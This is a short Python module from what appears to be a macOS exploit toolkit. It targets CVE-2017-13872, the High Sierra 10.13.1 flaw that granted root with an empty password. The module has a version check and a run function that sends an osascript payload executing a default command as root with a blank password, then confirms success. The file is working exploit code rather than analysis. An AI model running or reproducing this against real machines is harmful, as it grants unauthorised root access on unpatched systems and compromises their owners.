"""root with no password"""
from distutils.version import LooseVersion

from .general import DEFAULT_COMMAND, osascript, random_string

__cve__ = "2017-13872"
__credits__ = "lemiorhan"


def vulnerable(version):
    """checks vulnerability"""
    return version == LooseVersion("10.13.1")


def run():
    """runs exploit"""
    rand = random_string()
    payload = """osascript <<END
      set command to "{command}; echo {success}"
      return do shell script command user name "root" password "" with administrator privileges
    END""".format(
        command=DEFAULT_COMMAND, success=rand
    )
    response = osascript(payload)
    return rand in response
